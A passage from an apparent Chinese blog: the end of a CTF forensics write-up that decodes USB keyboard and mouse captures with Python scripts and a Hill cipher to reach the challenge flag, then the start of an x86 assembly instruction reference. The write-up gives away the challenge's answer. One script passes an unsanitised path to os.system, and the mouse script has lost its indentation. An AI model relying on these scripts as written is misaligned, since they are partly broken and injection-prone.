<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%8A%A4%E7%BD%91%E6%9D%AF2019-MISC-baby_forensic/1100338-20180814105104990-181933183.png" alt></p>
</blockquote>
<h4 id="键盘流量分析"><a href="#键盘流量分析" class="headerlink" title="键盘流量分析"></a>键盘流量分析</h4><p>我们可以写出脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="comment"># 00:00:xx:....</span></span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">'[unknown]'</span></span><br><span class="line">print(<span class="string">'output :n'</span> + output)</span><br></pre></td></tr></table></figure>

<p>如果直接从dat文件开始分析则脚本为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">DataFileName = <span class="string">"usb.dat"</span></span><br><span class="line">presses = []</span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        python UsbKeyboardHacker.py data.pcap"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Tips : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        To use this python script , you must install the tshark first."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        You can use `sudo apt-get install tshark` to install it"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Author : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        Angel_Kitty &lt;angelkitty6698@gmail.com&gt;"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        If you have any questions , please contact me by email."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        Thank you for using."</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    os.system(<span class="string">"tshark -r %s -T fields -e usb.capdata &gt; %s"</span> % (pcapFilePath, DataFileName))</span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> open(DataFileName, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            presses.append(line[<span class="number">0</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment"># handle</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> press <span class="keyword">in</span> presses:</span><br><span class="line">        Bytes = press.split(<span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">"00"</span>:</span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span>:</span><br><span class="line">                result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"20"</span>: <span class="comment"># shift key is pressed.</span></span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span>:</span><br><span class="line">                result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[-] Unknow Key : %s"</span> % (Bytes[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Found : %s"</span> % (result)</span><br><span class="line">    <span class="comment"># clean the temp data</span></span><br><span class="line">    os.system(<span class="string">"rm ./%s"</span> % (DataFileName))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>运行后我们得到一串信息：<strong>AAAAAAAAAA’ZITLQOSENPPI’.HILLDECODE</strong></p>
<h4 id="鼠标流量分析"><a href="#鼠标流量分析" class="headerlink" title="鼠标流量分析"></a>鼠标流量分析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nums = [] </span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>,<span class="string">'r'</span>) </span><br><span class="line">posx = <span class="number">0</span> </span><br><span class="line">posy = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys: </span><br><span class="line"><span class="keyword">if</span> len(line) != <span class="number">12</span> : </span><br><span class="line">     <span class="keyword">continue</span> </span><br><span class="line">x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>) </span><br><span class="line">y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>) </span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> : </span><br><span class="line">    x -= <span class="number">256</span> </span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> : </span><br><span class="line">    y -= <span class="number">256</span> </span><br><span class="line">posx += x </span><br><span class="line">posy += y </span><br><span class="line">btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line"><span class="keyword">if</span> btn_flag == <span class="number">1</span> : </span><br><span class="line">    <span class="keyword">print</span> posx , posy </span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure>

<h2 id="密码学分析"><a href="#密码学分析" class="headerlink" title="密码学分析"></a>密码学分析</h2><p>经过多种密码尝试最终得出这是一个希尔密码，其实特征也很明显，有一个矩阵还有一个密文，这里推介一个希尔密码的在线加解密网站：<a href="https://www.dcode.fr/hill-cipher" target="_blank" rel="noopener">https://www.dcode.fr/hill-cipher</a></p>
<p>我们得到一串信息：<strong>AAAAAAAAAA’ZITLQOSENPPI’.HILLDECODE</strong></p>
<p>在希尔密码中：</p>
<p><strong>ALPHABET (A=0) ABCDEFGHIJKLMNOPQRSTUVWXYZ</strong></p>
<p><strong>ALPHABET (A=1) ZABCDEFGHIJKLMNOPQRSTUVWXY</strong></p>
<p>而这题我们获得了十个A则可知加密方式为：</p>
<p><strong>ALPHABET (A=10) QRSTUVWXYZABCDEFGHIJKLMNOP</strong></p>
<p>我们之前获得了一个重要的信息：<strong>hill_matrix 3,2,2,9,7,7,6,4,9</strong></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%8A%A4%E7%BD%91%E6%9D%AF2019-MISC-baby_forensic/QQ%E6%88%AA%E5%9B%BE20190910161715.png" alt></p>
<p>解密可以得到：<strong>ZKNNTCUPZXOU</strong>，这题有一个小坑应全部转为小写才是正确的flag，故真正的flag应为：zknntcupzxou</p>
<blockquote>
<p>参考文章</p>
<ol>
<li>深入理解USB流量数据包的抓取与分析【<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html】" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html】</a></li>
<li>CTF MISC-USB流量分析出题记录【<a href="https://www.cnblogs.com/hackxf/p/10670844.html】" target="_blank" rel="noopener">https://www.cnblogs.com/hackxf/p/10670844.html】</a></li>
</ol>
</blockquote>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/09/X86║═X87╗π▒α╓╕┴ε┤≤╚½/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/09/X86║═X87╗π▒α╓╕┴ε┤≤╚½/" class="post-title-link" itemprop="url">X86和X87汇编指令大全</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-09 06:55:06 / Modified: 21:55:28" itemprop="dateCreated datePublished" datetime="2019-09-09T06:55:06-07:00">2019-09-09</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>做了一下相关汇编指令的收集</p>
<h2 id="整数运算指令集"><a href="#整数运算指令集" class="headerlink" title="整数运算指令集"></a>整数运算指令集</h2><h3 id="数据传输指令"><a href="#数据传输指令" class="headerlink" title="数据传输指令"></a>数据传输指令</h3><p>它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据</p>
<h3 id="通用数据传送指令"><a href="#通用数据传送指令" class="headerlink" title="通用数据传送指令"></a>通用数据传送指令</h3><table>
<thead>
<tr>
<th align="center">MOV</th>
<th align="center">传送字或字节</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>MOVSX</strong></td>
<td align="center"><strong>先符号扩展,再传送</strong></td>
</tr>
<tr>
<td align="center"><strong>MOVZX</strong></td>
<td align="center"><strong>先零扩展,再传送</strong></td>
</tr>
<tr>
<td align="center"><strong>PUSH</strong></td>
<td align="center"><strong>把字压入堆栈</strong></td>
</tr>
<tr>
<td align="center"><strong>POP</strong></td>
<td align="center"><strong>把字弹出堆栈</strong></td>
</tr>
<tr>
<td align="center"><strong>PUSHA</strong></td>
<td align="center"><strong>把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈</strong></td>
</tr>
<tr>
<td align="center"><strong>POPA</strong></td>
<td align="center"><strong>把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈</strong></td>
</tr>
<tr>
<td align="center"><strong>PUSHAD</strong></td>
<td align="center"><strong>把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈</strong></td>
</tr>
<tr>
<td align="center"><strong>POPAD</strong></td>
<td align="center"><strong>把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈</strong></td>
</tr>
<tr>
<td align="center"><strong>BSWAP</strong></td>
<td align="center"><strong>交换32位寄存器里字节的顺序</strong></td>
</tr>
<tr>
<td align="center"><strong>XCHG</strong></td>
<td align="center"><strong>交换字或字节(至少有一个操作数为寄存器,段寄存器不可作为操作数)</strong></td>
</tr>
<tr>
<td align="center"><strong>CMPXCHG</strong></td>
<td align="center"><strong>比较并交换操作数(第二个操作数必须为累加器AL/AX/EAX)</strong></td>
</tr>
<tr>
<td align="center"><strong>XADD</strong></td>
<td align="center"><strong>先交换再累加(结果在第一个操作数里)</strong></td>
</tr>
<tr>
<td align="center"><strong>XLAT</strong></td>
<td align="center"><strong>字节查表转换</strong></td>
</tr>
</tbody></table>
<h3 id="输入输出端口传送指令"><a href="#输入输出端口传送指令" class="headerlink" title="输入输出端口传送指令"></a>输入输出端口传送指令</h3><p>输入输出端口由立即方式指定时，其范围是 <strong>0-255</strong>; 由寄存器 <strong>DX</strong> 指定时,其范围是：<strong>0-65535</strong></p>
<table>
<thead>
<tr>
<th align="center">IN</th>
<th align="center">I/O端口输入</th>
<th align="center">语法: IN   累加器,    {端口号│DX}</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>OUT</strong></td>
<td align="center"><strong>I/O端口输出</strong></td>
<td align="center"><strong>语法: OUT {端口号│DX},累加器</strong></td>
</tr>
</tbody></table>
<h3 id="目的地址传送指令"><a href="#目的地址传送指令" class="headerlink" title="目的地址传送指令"></a>目的地址传送指令</h3><table>
<thead>
<tr>
<th align="center">LEA</th>
<th align="center">装入有效地址</th>
<th align="center">LEA DX,string ;把偏移地址存到DX</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>LDS</strong></td>
<td align="center"><strong>传送目标指针,把指针内容装入DS</strong></td>
<td align="center"><strong>LDS SI,string;把段地址:偏移地址存到DS:SI</strong></td>
</tr>
<tr>
<td align="center"><strong>LES</strong></td>
<td align="center"><strong>传送目标指针,把指针内容装入ES</strong></td>
<td align="center"><strong>LES DI,string;把段地址:偏移地址存到ES:DI</strong></td>
</tr>
<tr>
<td align="center"><strong>LFS</strong></td>
<td align="center"><strong>传送目标指针,把指针内容装入FS</strong></td>
<td align="center"><strong>LFS DI,string;把段地址:偏移地址存到FS:DI</strong></td>
</tr>
<tr>
<td align="center"><strong>LGS</strong></td>
<td align="center"><strong>传送目标指针,把指针内容装入GS</strong></td>
<td align="center"><strong>LGS DI,string;把段地址:偏移地址存到GS:DI</strong></td>
</tr>
<tr>
<td align="center"><strong>LSS</strong></td>
<td align="center"><strong>传送目标指针,把指针内容装入SS</strong></td>
<td align="center"><strong>LSS DI,string;把段地址:偏移地址存到SS:DI</strong></td>
</tr>
</tbody></table>
<h3 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h3><table>
<thead>
<tr>
<th align="center">LAHF</th>
<th align="center">标志寄存器传送,把标志装入AH</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>SAHF</strong></td>
<td align="center"><strong>标志寄存器传送,把AH内容装入标志寄存器</strong></td>
</tr>
<tr>
<td align="center"><strong>PUSHF</strong></td>
<td align="center"><strong>标志入栈</strong></td>
</tr>
<tr>
<td align="center"><strong>POPF</strong></td>
<td align="center"><strong>标志出栈</strong></td>
</tr>
<tr>
<td align="center"><strong>PUSHD</strong></td>
<td align="center"><strong>32位标志入栈</strong></td>
</tr>
<tr>
<td align="center"><strong>POPD</strong></td>
<td align="center"><strong>32位标志出栈</strong></td>
</tr>
</tbody></table>
<h3 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h3><table>
<thead>
<tr>
<th align="center">ADD</th>
<th align="center">加法</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>ADC</strong></td>
<td align="center"><strong>带进位加法</strong></td>
</tr>
<tr>
<td align="center"><strong>INC</strong></td>
<td align="center"><strong>加 1</strong></td>
</tr>
<tr>
<td align="center"><strong>AAA</strong></td>
<td align="center"><strong>加法的ASCII码调整</strong></td>
</tr>
<tr>
<td align="center"><strong>DAA</strong></td>
<td align="center"><strong>加法的十进制调整</strong></td>
</tr>
<tr>
<td align="center"><strong>SUB</strong></td>
<td align="center"><strong>减法</strong></td>
</tr>
<tr>
<td align="center"><strong>SBB</strong></td>
<td align="center"><strong>带借位减法</strong></td>
</tr>
<tr>
<td align="center"><strong>DEC</strong></td>
<td align="center"><strong>减 1</strong></td>
</tr>
<tr>
<td align="center"><strong>NEG</strong></td>
<td align="center"><strong>求反(以    0 减之)</strong></td>
</tr>
<tr>
<td align="center"><strong>CMP</strong></td>
<td align="center"><strong>比较(两操作数作减法,仅修改标志位,不回送结果)</strong></td>
</tr>
<tr>
<td align="center"><strong>AAS</strong></td>
<td align="center"><strong>减法的ASCII码调整</strong></td>
</tr>
<tr>
<td align="center"><strong>DAS</strong></td>
<td align="center"><strong>减法的十进制调整</strong></td>
</tr>
<tr>
<td align="center"><strong>MUL</strong></td>
<td align="center"><strong>无符号乘法,结果回送AH和AL(字节运算),或DX和AX(字运算)</strong></td>
</tr>
<tr>
<td align="center"><strong>IMUL</strong></td>
